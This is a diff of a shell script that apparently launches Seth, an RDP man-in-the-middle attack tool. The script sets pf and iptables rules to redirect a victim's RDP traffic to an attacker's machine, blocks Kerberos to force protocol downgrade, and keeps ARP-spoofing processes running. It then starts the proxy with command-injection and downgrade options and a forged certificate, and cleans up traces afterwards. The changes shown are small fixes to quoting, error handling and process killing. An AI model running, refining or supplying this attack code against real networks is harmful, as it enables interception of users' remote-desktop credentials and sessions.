@@ -116,7 +116,7 @@ set_iptables_2 () {
 
 # Define function to add/remove pf rules on the fly for RDP routing and NAT
 set_pf_1 () {
-    echo "block drop in on $IFACE proto tcp from $VICTIM_IP to any port 3389 flags S/S" >> $PF_TMP_FILE
+    echo "block return on "$IFACE" proto tcp from "$VICTIM_IP" to any port 3389 flags S/S" >> $PF_TMP_FILE    
 
     $PFCTL -qf $PF_TMP_FILE 2>/dev/null 1>&2
 }
@@ -124,13 +124,11 @@ set_pf_1 () {
 set_pf_2 () {
     rm $PF_TMP_FILE 2>/dev/null 1>&2
 
-    echo "rdr pass on $IFACE inet proto tcp from $VICTIM_IP to $ORIGINAL_DEST port 3389 -> $ATTACKER_IP" >> $PF_TMP_FILE
-    echo "block return-rst out on $IFACE proto tcp from $VICTIM_IP to any port 88" >> $PF_TMP_FILE
+    echo "rdr on $IFACE inet proto {tcp, udp} from $VICTIM_IP to $ORIGINAL_DEST port 3389 -> $ATTACKER_IP" >> $PF_TMP_FILE
 
-    # After vi tim clicks on "OK" in the login dialog, Seth starts an infinite loop triggering the error on seth/main.py:58
-    # Since there's no credentials yet and the connection is not in a dirty state, the loop is infinite and the connection is never established
-    # Victim stucks on "Securing Remote Connection..."
-    # As soon as Seth dies, client is prompted to accept the server certificate and is able to login
+    # Drop Kerberos packers
+    echo "block return-rst on $IFACE proto tcp from $VICTIM_IP to any port 88" >> $PF_TMP_FILE
+
     $PFCTL -qf $PF_TMP_FILE 2>/dev/null 1>&2
 }
 
@@ -145,12 +143,13 @@ function finish {
         # Flush everything from pf queues
         $PFCTL -qF all 2>/dev/null 1>&2
 
+        echo "[*] Restore default pf status and configuration"
         # If PF was disabled, disable it, otherwise reload the default conf file
         if [ "$PF_STATUS" == "Disabled" ];
         then
             $PFCTL -qd 2>/dev/null 1>&2
         else
-            $PFCTL -qf $PF_CONF_FILE
+            $PFCTL -qf $PF_CONF_FILE 2>/dev/null 1>&2
         fi
         rm $PF_TMP_FILE 2>/dev/null 1>&2
     else
@@ -158,12 +157,12 @@ function finish {
         set_iptables_2 D 2>/dev/null 1>&2
         printf "%s" "$IP_FORWARD" > /proc/sys/net/ipv4/ip_forward
     fi
-    kill -9 $ARP_PID_1 2>/dev/null 1>&2
-    kill -9 $ARP_PID_2 2>/dev/null 1>&2
+    kill $ARP_PID_1 2>/dev/null 1>&2
+    kill $ARP_PID_2 2>/dev/null 1>&2
     pkill -P $$
 
-    # Clear certificate in caso of emergency
-    find /tmp/ -name "$ORIGINAL_DEST"* -exec rm  {} \;
+    # Clear certificates
+    find /tmp/ -name "$ORIGINAL_DEST"* -exec rm  {} \; 2>/dev/null 1>&2
     echo "[*] Done"
 }
 trap finish EXIT
@@ -243,6 +242,6 @@ fi
 echo "[*] Run RDP proxy..."
 
 $SCRIPT_DIR/seth.py \
-    $INJECT_COMMAND $DEBUG_FLAG -g "$SETH_DOWNGRADE"\
-    -c "$CERTPATH" -k "$KEYPATH" \
-    "$ORIGINAL_DEST"
+    $INJECT_COMMAND $DEBUG_FLAG -g $SETH_DOWNGRADE \
+    -c $CERTPATH -k $KEYPATH \
+    $ORIGINAL_DEST
